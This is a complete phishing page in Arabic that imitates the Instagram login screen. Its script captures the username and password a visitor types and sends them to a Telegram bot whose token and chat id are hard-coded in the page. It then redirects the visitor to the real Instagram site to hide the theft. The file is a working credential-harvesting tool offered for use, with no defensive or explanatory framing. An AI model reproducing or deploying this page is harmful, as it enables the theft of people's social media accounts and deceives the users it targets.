<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - Instagram</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            direction: rtl; /* اتجاه النصوص من اليمين لليسار */
        }
        .login-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 20px;
            width: 90%; /* تقليل العرض ليكون مناسبًا للشاشات الصغيرة */
            max-width: 360px; /* تحديد عرض أقصى يناسب الهواتف */
            text-align: center;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
        }
        .login-container img {
            width: 150px; /* تقليل حجم الشعار ليتناسب مع الهواتف */
            margin-bottom: 20px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px 10px;
            margin: 10px 0;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 16px;
            text-align: right; /* محاذاة النصوص لليمين */
        }
        .login-options {
            margin: 10px 0; /* المسافة بين الحقول */
            text-align: center; /* محاذاة النصوص في الوسط */
        }
        .login-options a {
            color: #3897f0;
            text-decoration: none;
            font-size: 16px; /* تكبير حجم النص */
        }
        button {
            width: 100%;
            padding: 12px 0;
            background-color: #3897f0;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px; /* المسافة بين الحقول وزر "تسجيل الدخول" */
        }
        button:hover {
            background-color: #318ce7;
        }
        .facebook-login {
            background-color: #4267B2;
            color: #fff;
            font-weight: bold;
            margin-top: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 12px 0;
            border-radius: 5px;
            border: none;
        }
        .facebook-login img {
            width: 20px; /* حجم الأيقونة صغير */
            height: 20px; /* جعل الأيقونة مربعة */
            margin-right: 10px; /* المسافة بين الأيقونة والنص */
        }
        .facebook-login span {
            font-size: 14px; /* تصغير حجم النص */
        }
        .footer {
            margin-top: 30px; /* زيادة المسافة بين النصوص الأخرى و"أليس لديك حساب؟" */
            font-size: 14px;
            color: #8e8e8e;
        }
        .footer a {
            color: #3897f0;
            text-decoration: none;
        }
    </style>
</head>
<body>

<div class="login-container">
    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo">
    <button class="facebook-login">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Icon">
        <span>متابعة بحساب فيسبوك</span>
    </button>
    <div class="login-options">أو</div>
    <form id="loginForm" method="POST">
        <input type="hidden" name="chat_id" value="1900509620">
        <input type="hidden" name="text" id="message">
        <input type="text" id="username" placeholder="رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني" required>
        <input type="password" id="password" placeholder="كلمة السر" required>
        <div class="login-options">
            <a href="#">هل نسيت كلمة السر؟</a>
        </div>
        <button type="submit" onclick="sendTelegram(event)">تسجيل الدخول</button>
    </form>
    <div class="footer">   
        أليس لديك حساب؟ <a href="#">تسجيل</a>
    </div>
</div>

<script>
    function sendTelegram(event) {
        event.preventDefault();  // منع إرسال النموذج افتراضيًا

        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;
        var message = "Email: " + username + "\nPassword: " + password;

        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://api.telegram.org/bot6421601945:AAHfCxgub4hJFRp-bJqLEGg7EGJs6VnxYzQ/sendMessage", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.send("chat_id=1900509620&text=" + encodeURIComponent(message));

        // إعادة التوجيه إلى موقع إنستجرام بعد الإرسال
        xhr.onload = function() {
            window.location.href = "https://www.instagram.com";
        };
    }
</script>

</body>
</html>
